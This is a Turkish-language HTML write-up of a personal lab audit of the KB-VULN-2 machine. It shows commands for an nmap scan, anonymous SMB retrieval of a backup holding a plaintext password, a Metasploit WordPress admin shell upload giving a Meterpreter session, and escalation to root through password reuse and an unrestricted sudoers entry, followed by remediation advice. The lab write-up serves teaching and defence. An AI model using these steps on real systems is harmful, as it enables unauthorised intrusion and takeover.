@@ -1,0 +1,494 @@
+<title>KB-VULN-2 — Güvenlik Denetim Raporu</title>
+<style>
+  :root{
+    --bg:#F2F3F6;
+    --surface:#FFFFFF;
+    --surface-2:#E8EAF0;
+    --ink:#12151C;
+    --ink-soft:#545B6B;
+    --line:#D7DAE2;
+    --accent:#A87C1E;
+    --accent-ink:#FFFFFF;
+    --term-bg:#0D1117;
+    --term-ink:#C9D1D9;
+    --term-dim:#7D8590;
+    --good:#2E7D4F;
+    --crit:#B54747;
+    --shadow: 0 1px 2px rgba(18,21,28,0.04), 0 8px 24px -12px rgba(18,21,28,0.12);
+  }
+  @media (prefers-color-scheme: dark){
+    :root{
+      --bg:#0B0E14;
+      --surface:#12151D;
+      --surface-2:#171B26;
+      --ink:#E7E9EF;
+      --ink-soft:#9AA3B5;
+      --line:#232838;
+      --accent:#D9B453;
+      --accent-ink:#14151A;
+      --term-bg:#08090D;
+      --term-ink:#C9D1D9;
+      --term-dim:#6B7280;
+      --good:#4CAF7D;
+      --crit:#E07272;
+      --shadow: 0 1px 2px rgba(0,0,0,0.3), 0 12px 32px -16px rgba(0,0,0,0.6);
+    }
+  }
+  :root[data-theme="dark"]{
+    --bg:#0B0E14; --surface:#12151D; --surface-2:#171B26; --ink:#E7E9EF; --ink-soft:#9AA3B5;
+    --line:#232838; --accent:#D9B453; --accent-ink:#14151A; --term-bg:#08090D; --term-ink:#C9D1D9;
+    --term-dim:#6B7280; --good:#4CAF7D; --crit:#E07272;
+    --shadow: 0 1px 2px rgba(0,0,0,0.3), 0 12px 32px -16px rgba(0,0,0,0.6);
+  }
+  :root[data-theme="light"]{
+    --bg:#F2F3F6; --surface:#FFFFFF; --surface-2:#E8EAF0; --ink:#12151C; --ink-soft:#545B6B;
+    --line:#D7DAE2; --accent:#A87C1E; --accent-ink:#FFFFFF; --term-bg:#0D1117; --term-ink:#C9D1D9;
+    --term-dim:#7D8590; --good:#2E7D4F; --crit:#B54747;
+    --shadow: 0 1px 2px rgba(18,21,28,0.04), 0 8px 24px -12px rgba(18,21,28,0.12);
+  }
+
+  *{box-sizing:border-box;}
+  body{
+    margin:0;
+    background:var(--bg);
+    color:var(--ink);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    line-height:1.65;
+    -webkit-font-smoothing:antialiased;
+  }
+  .page{
+    max-width:760px;
+    margin:0 auto;
+    padding:0 24px 96px;
+  }
+  a{color:var(--accent);}
+  a:focus-visible, button:focus-visible{outline:2px solid var(--accent); outline-offset:2px;}
+
+  h1,h2,h3{
+    font-family:"Iowan Old Style","Palatino Linotype",Palatino,Georgia,serif;
+    text-wrap:balance;
+    font-weight:600;
+    color:var(--ink);
+  }
+
+  /* ---- Cover ---- */
+  .cover{
+    padding:64px 0 40px;
+    border-bottom:1px solid var(--line);
+    margin-bottom:40px;
+  }
+  .cover-top{
+    display:flex;
+    align-items:center;
+    gap:20px;
+    margin-bottom:28px;
+  }
+  .kb-icon{
+    width:88px; height:88px;
+    border-radius:20px;
+    background:radial-gradient(circle at 30% 25%, #3A2E12, #0B0E1C 75%);
+    box-shadow:var(--shadow);
+    flex:none;
+    display:block;
+  }
+  .kb-icon .ln{stroke:rgba(217,180,83,0.5); stroke-width:1.4; fill:none;}
+  .kb-icon .st{fill:#ffffff;}
+  .kb-icon .st.glow{opacity:.3;}
+  .cover-eyebrow{
+    font-family:ui-monospace,SFMono-Regular,Consolas,"Liberation Mono",Menlo,monospace;
+    font-size:.72rem;
+    letter-spacing:.14em;
+    text-transform:uppercase;
+    color:var(--accent);
+    margin:0 0 6px;
+  }
+  .cover h1{
+    font-size:2.6rem;
+    margin:0;
+    line-height:1.05;
+  }
+  .cover p.dek{
+    max-width:56ch;
+    color:var(--ink-soft);
+    font-size:1.05rem;
+    margin:18px 0 0;
+  }
+  .meta-grid{
+    display:grid;
+    grid-template-columns:repeat(4,1fr);
+    gap:1px;
+    background:var(--line);
+    border:1px solid var(--line);
+    border-radius:10px;
+    overflow:hidden;
+    margin-top:32px;
+  }
+  .meta-cell{
+    background:var(--surface);
+    padding:14px 16px;
+  }
+  .meta-cell .k{
+    display:block;
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.66rem;
+    letter-spacing:.08em;
+    text-transform:uppercase;
+    color:var(--ink-soft);
+    margin-bottom:5px;
+  }
+  .meta-cell .v{
+    font-size:.92rem;
+    font-weight:600;
+    font-variant-numeric:tabular-nums;
+  }
+  .v.diff{color:var(--good);}
+
+  /* ---- chain ---- */
+  .chain{
+    display:flex;
+    flex-wrap:wrap;
+    align-items:center;
+    gap:6px;
+    margin:36px 0 8px;
+  }
+  .chain .step{
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.72rem;
+    letter-spacing:.03em;
+    background:var(--surface-2);
+    border:1px solid var(--line);
+    color:var(--ink);
+    padding:6px 11px;
+    border-radius:6px;
+    white-space:nowrap;
+  }
+  .chain .arrow{color:var(--ink-soft); font-size:.85rem;}
+
+  /* ---- sections ---- */
+  section{margin:56px 0;}
+  .section-label{
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.72rem;
+    letter-spacing:.14em;
+    text-transform:uppercase;
+    color:var(--accent);
+    margin:0 0 8px;
+  }
+  h2{font-size:1.5rem; margin:0 0 4px;}
+  h3{font-size:1.1rem; margin:28px 0 10px; color:var(--ink);}
+  p{margin:14px 0; max-width:66ch;}
+  ul, ol{margin:14px 0; padding-left:1.3em; max-width:64ch;}
+  li{margin:6px 0;}
+  code.inline{
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    background:var(--surface-2);
+    border:1px solid var(--line);
+    padding:.12em .4em;
+    border-radius:4px;
+    font-size:.87em;
+  }
+
+  /* ---- terminal blocks ---- */
+  .term{
+    background:var(--term-bg);
+    border-radius:10px;
+    box-shadow:var(--shadow);
+    overflow:hidden;
+    margin:18px 0;
+  }
+  .term-bar{
+    display:flex;
+    align-items:center;
+    gap:6px;
+    padding:9px 12px;
+    border-bottom:1px solid rgba(255,255,255,0.06);
+  }
+  .term-bar .dot{width:9px; height:9px; border-radius:50%; background:#4b5062;}
+  .term-title{
+    margin-left:8px;
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.7rem;
+    color:var(--term-dim);
+  }
+  .term pre{
+    margin:0;
+    padding:14px 16px 16px;
+    overflow-x:auto;
+    font-family:ui-monospace,SFMono-Regular,Consolas,"Liberation Mono",Menlo,monospace;
+    font-size:.82rem;
+    line-height:1.6;
+    color:var(--term-ink);
+  }
+  .term .p{color:var(--accent);}
+  .term .c{color:#7EC7A2;}
+  .term .o{color:var(--term-dim);}
+  .term .hit{color:#E8B563;}
+
+  /* ---- callouts ---- */
+  .callout{
+    border-left:3px solid var(--accent);
+    background:var(--surface);
+    border-radius:0 8px 8px 0;
+    padding:14px 18px;
+    margin:18px 0;
+    box-shadow:var(--shadow);
+  }
+  .callout .lbl{
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.68rem;
+    letter-spacing:.1em;
+    text-transform:uppercase;
+    color:var(--accent);
+    display:block;
+    margin-bottom:6px;
+  }
+  .callout.crit{border-left-color:var(--crit);}
+  .callout.crit .lbl{color:var(--crit);}
+  .callout.good{border-left-color:var(--good);}
+  .callout.good .lbl{color:var(--good);}
+
+  table.simple{
+    width:100%;
+    border-collapse:collapse;
+    margin:18px 0;
+    font-size:.88rem;
+  }
+  table.simple th, table.simple td{
+    text-align:left;
+    padding:8px 10px;
+    border-bottom:1px solid var(--line);
+    font-variant-numeric:tabular-nums;
+  }
+  table.simple th{
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.68rem;
+    letter-spacing:.06em;
+    text-transform:uppercase;
+    color:var(--ink-soft);
+    font-weight:600;
+  }
+  .sev{font-weight:700;}
+  .sev.crit{color:var(--crit);}
+  .sev.high{color:var(--accent);}
+  .sev.med{color:var(--ink-soft);}
+
+  .flag{
+    display:inline-flex;
+    align-items:center;
+    gap:8px;
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.85rem;
+    background:var(--surface-2);
+    border:1px solid var(--line);
+    padding:8px 12px;
+    border-radius:7px;
+  }
+  .flag .tick{color:var(--good); font-weight:700;}
+
+  footer{
+    margin-top:64px;
+    padding-top:20px;
+    border-top:1px solid var(--line);
+    color:var(--ink-soft);
+    font-size:.82rem;
+  }
+
+  @media (max-width:560px){
+    .meta-grid{grid-template-columns:repeat(2,1fr);}
+    .cover h1{font-size:2rem;}
+  }
+
+  @media print{
+    @page{ margin:14mm; }
+    *{
+      -webkit-print-color-adjust:exact !important;
+      print-color-adjust:exact !important;
+      color-adjust:exact !important;
+    }
+    body{background:#fff;}
+    .page{max-width:none;}
+    .term{box-shadow:none; border:1px solid #333;}
+    .callout{box-shadow:none;}
+    .term, .callout, .meta-grid, .flag, table.simple{break-inside:avoid;}
+    h2, h3, .section-label{break-after:avoid;}
+    .cover{break-inside:avoid;}
+  }
+</style>
+
+<div class="page">
+
+  <div class="cover">
+    <div class="cover-top">
+      <svg class="kb-icon" viewBox="0 0 88 88" aria-hidden="true">
+        <g class="ln">
+          <circle cx="44" cy="24" r="7"/>
+          <circle cx="20" cy="62" r="7"/>
+          <circle cx="68" cy="62" r="7"/>
+          <line x1="44" y1="31" x2="20" y2="55"/>
+          <line x1="44" y1="31" x2="68" y2="55"/>
+          <line x1="27" y1="62" x2="61" y2="62"/>
+        </g>
+        <circle class="st glow" cx="44" cy="24" r="3"/>
+        <circle class="st glow" cx="20" cy="62" r="3"/>
+        <circle class="st glow" cx="68" cy="62" r="3"/>
+      </svg>
+      <div>
+        <p class="cover-eyebrow">Kişisel Lab · Denetim · Linux</p>
+        <h1>KB-VULN-2</h1>
+      </div>
+    </div>
+    <p class="dek">Anonim SMB erişimiyle sızdırılan bir yedekten ele geçirilen açık metin parolanın WordPress üzerinden uzaktan kod çalıştırmaya, oradan da hatalı bir sudoers yapılandırmasıyla root'a uzandığı bir güvenlik denetimi. Rapor, üç farklı saldırgan profili (Eve, Dropbox, Mallory) üzerinden bir tehdit modeli olarak yapılandırılmıştır.</p>
+
+    <div class="meta-grid">
+      <div class="meta-cell"><span class="k">Hedef</span><span class="v">kb.vuln (192.168.1.118)</span></div>
+      <div class="meta-cell"><span class="k">Tip</span><span class="v">Kişisel Lab / Denetim</span></div>
+      <div class="meta-cell"><span class="k">İşletim Sistemi</span><span class="v">Linux</span></div>
+      <div class="meta-cell"><span class="k">Kategori</span><span class="v">SMB / WordPress / Sudoers</span></div>
+    </div>
+
+    <div class="chain">
+      <span class="step">Nmap Recon</span><span class="arrow">→</span>
+      <span class="step">Anonim SMB</span><span class="arrow">→</span>
+      <span class="step">backup.zip</span><span class="arrow">→</span>
+      <span class="step">remember_me.txt</span><span class="arrow">→</span>
+      <span class="step">WordPress RCE</span><span class="arrow">→</span>
+      <span class="step">www-data</span><span class="arrow">→</span>
+      <span class="step">parola reuse</span><span class="arrow">→</span>
+      <span class="step">kbadmin</span><span class="arrow">→</span>
+      <span class="step">sudoers (ALL:ALL)</span><span class="arrow">→</span>
+      <span class="step">root</span>
+    </div>
+  </div>
+
+  <section>
+    <p class="section-label">Tehdit Modeli</p>
+    <h2>Üç saldırgan profili</h2>
+    <p>Denetim, gerçek dünya saldırı senaryolarını temsil eden üç aktör üzerinden yürütülmüştür: <strong>Eve</strong> (sadece ağ servislerine erişimi olan dış saldırgan), <strong>Dropbox</strong> (SSH erişimi olmayan ama SMB/WordPress üzerinden veri manipülasyonu yapabilen aktif-kısıtlı saldırgan) ve <strong>Mallory</strong> (sistemde düşük yetkili <code class="inline">kbadmin</code> hesabına sahip iç saldırgan).</p>
+
+    <table class="simple">
+      <tr><th>Aktör</th><th>Şifreli Veri Erişimi</th><th>Yerel Sistem Erişimi</th></tr>
+      <tr><td>Eve</td><td>Salt-okunur</td><td>Yok (sadece ağ erişimi)</td></tr>
+      <tr><td>Dropbox</td><td>Okuma-yazma</td><td>Yok (servis üzerinden veri değişimi)</td></tr>
+      <tr><td>Mallory</td><td>Okuma-yazma</td><td>Tam erişim (kbadmin)</td></tr>
+    </table>
+  </section>
+
+  <section>
+    <p class="section-label">Bulgular Özeti</p>
+    <h2>Teknik bulgular</h2>
+    <table class="simple">
+      <tr><th>Bulgu</th><th>Servis</th><th>Risk</th><th>CVSS</th></tr>
+      <tr><td>Anonim SMB Erişimi</td><td>Samba (Port 445)</td><td class="sev high">Yüksek</td><td>7.5</td></tr>
+      <tr><td>Açık Metin Parola / WordPress RCE</td><td>WordPress</td><td class="sev crit">Kritik</td><td>9.1</td></tr>
+      <tr><td>Hatalı Sudoers Yapılandırması</td><td>İşletim Sistemi (kbadmin)</td><td class="sev crit">Kritik</td><td>8.8</td></tr>
+    </table>
+  </section>
+
+  <section>
+    <p class="section-label">01 — Keşif</p>
+    <h2>Nmap ile ağ taraması</h2>
+    <p>Hedef sistemde (192.168.1.118) yapılan taramada beş açık servis tespit edildi: FTP, SSH, HTTP ve Samba'ya ait iki port.</p>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">nmap kb.vuln</span></div>
+      <pre><span class="p">$</span> nmap -sV kb.vuln
+Nmap scan report for kb.vuln (192.168.1.118)
+Host is up (0.00021s latency).
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+80/tcp  open  http
+139/tcp open  netbios-ssn
+<span class="hit">445/tcp open  microsoft-ds</span></pre>
+    </div>
+
+    <div class="callout good">
+      <span class="lbl">Olumlu gözlem</span>
+      Sadece gerekli servisler (21, 22, 80, 445) dışa açık bırakılmış; vsFTPd servisi de bilinen <code class="inline">mod_copy</code> saldırılarına karşı güvenli bulunmuştur.
+    </div>
+  </section>
+
+  <section>
+    <p class="section-label">02 — VULN-01</p>
+    <h2>Anonim SMB erişimi ve hassas bilgi ifşası</h2>
+    <p>Samba (Port 445) servisi üzerinde "Anonymous" girişi aktif bırakılmıştı. Anonim erişimle bağlanan saldırgan (Eve), <code class="inline">/Anonymous</code> paylaşımında sistemin yedeğini (<code class="inline">backup.zip</code>) buldu.</p>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">smbclient anonim erişim</span></div>
+      <pre><span class="p">$</span> smbclient //192.168.1.118/Anonymous -N
+Try "help" to get a list of possible commands.
+<span class="p">smb: \></span> get backup.zip</pre>
+    </div>
+
+    <p>Yedek içerisinde bulunan <code class="inline">remember_me.txt</code> dosyasında yönetici parolası açık metin olarak duruyordu:</p>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">remember_me.txt</span></div>
+      <pre><span class="p">$</span> cat ./remember_me.txt
+Username:admin
+Password:<span class="hit">MachineBoy141</span></pre>
+    </div>
+
+    <div class="callout crit">
+      <span class="lbl">Etki</span>
+      Bu tek dosya, saldırganın sistemin dosya yapısını ve konfigürasyonlarını ele geçirmesinin yanı sıra, aynı parolanın hem WordPress hem de sistem kullanıcısı için ortak kullanıldığının da kapısını aralamıştır.
+    </div>
+  </section>
+
+  <section>
+    <p class="section-label">03 — VULN-02</p>
+    <h2>Açık metin parola ile WordPress RCE</h2>
+    <p>SMB üzerinden sızdırılan <code class="inline">MachineBoy141</code> parolası WordPress admin paneline karşı doğrulandı ve geçerli çıktı. Yönetici yetkisiyle bir eklenti (plugin) yükleme mekanizması üzerinden sunucuda kod çalıştırıldı.</p>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">msfconsole</span></div>
+      <pre><span class="p">msf</span> > use exploit/unix/webapp/wp_admin_shell_upload
+<span class="p">msf</span> > set rhosts 192.168.1.118
+<span class="p">msf</span> > set username admin
+<span class="p">msf</span> > set password MachineBoy141
+<span class="p">msf</span> > exploit
+<span class="o">[*] Uploading payload...</span>
+<span class="hit">[*] Meterpreter session opened</span>
+
+<span class="p">meterpreter</span> > getuid
+Server username: <span class="hit">www-data</span></pre>
+    </div>
+
+    <div class="flag"><span class="tick">✓</span> www-data yetkisiyle uzaktan kod çalıştırma (RCE) sağlandı</div>
+  </section>
+
+  <section>
+    <p class="section-label">04 — VULN-03</p>
+    <h2>Hatalı sudoers yapılandırması ve yetki yükseltme</h2>
+    <p>Aynı parolanın (<code class="inline">MachineBoy141</code>) sistem kullanıcısı <code class="inline">kbadmin</code> için de geçerli olduğu görüldü — SSH ile bu kullanıcıya geçiş yapıldı. Yetki kontrolünde, kullanıcıya <code class="inline">/etc/sudoers</code> üzerinde sınırsız yetki tanındığı ortaya çıktı.</p>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">sudo -l &amp; privesc</span></div>
+      <pre><span class="p">kbadmin@kb-server</span>:~$ sudo -l
+User kbadmin may run the following commands on kb-server:
+    <span class="hit">(ALL : ALL) ALL</span>
+<span class="p">kbadmin@kb-server</span>:$ sudo su
+<span class="p">root@kb-server</span>:~# cat flag.txt
+<span class="o">[redacted]</span></pre>
+    </div>
+
+    <p>Kullanıcının herhangi bir kısıtlama olmaksızın <code class="inline">(ALL : ALL) ALL</code> yetkisine sahip olması, tek bir <code class="inline">sudo su</code> komutuyla doğrudan root olunmasına izin verdi.</p>
+
+    <div class="flag"><span class="tick">✓</span> root yetkisiyle tam sistem kontrolü sağlandı</div>
+  </section>
+
+  <section>
+    <p class="section-label">Çözüm ve İyileştirme</p>
+    <h2>Öneriler</h2>
+    <ul>
+      <li><strong>Sıkılaştırma:</strong> SMB anonim erişimi derhal kapatılmalı, konuk kullanıcıların dosya listelemesi engellenmelidir.</li>
+      <li><strong>Erişim Kontrolü:</strong> Sudoers dosyası "en az yetki" (least privilege) prensibine göre yeniden yapılandırılmalı, <code class="inline">(ALL:ALL)</code> gibi genel yetkiler kaldırılmalıdır.</li>
+      <li><strong>Parola Güvenliği:</strong> Kritik parolalar asla açık metin dosyalarında saklanmamalı; farklı servisler için benzersiz parolalar kullanılmalıdır.</li>
+    </ul>
+  </section>
+
+  <footer>
+    Kişisel lab notu — kb.vuln (192.168.1.118), eğitim/lab ortamı. Flag değerleri bu belgede paylaşılmamıştır.
+  </footer>
+
+</div>
